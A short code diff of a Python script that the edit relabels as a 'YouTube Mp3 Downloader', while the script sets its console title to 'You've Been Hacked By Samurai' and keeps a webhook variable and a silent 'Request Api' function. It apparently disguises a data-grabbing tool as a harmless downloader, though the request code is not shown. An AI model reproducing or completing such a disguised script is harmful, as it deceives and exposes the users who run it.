@@ -1,7 +1,8 @@
-# Copyright © 2022 All Rights Reserved
-# Developed & Programmed By Null
-# For More Information Contact @entrysquad (IG)
+# Copyright (c) 2022 All Rights Reserved / Null
+# YouTube Mp3 Downloader Developed & Programmed By Null
+# Gain our Friendsip - @entrysquad (IG) @overexcited (T)
 
+# Libraries
 import requests
 import colorama
 import os
@@ -10,7 +11,7 @@ from os import system
 colorama.init(autoreset=True)
 system("title " + "You've Been Hacked By Samurai")
 
-webhook = ""
+webhook = "Webhook"
 
 # Null
 logo = f"""
@@ -22,7 +23,6 @@ logo = f"""
 print(Fore.RED+logo)
 
 
-# Def Function
 def Samurai():
   try:
     # Request Api
@@ -34,4 +34,4 @@ def Samurai():
     pass
 
 Samurai()
-# End Codding /
+# End /
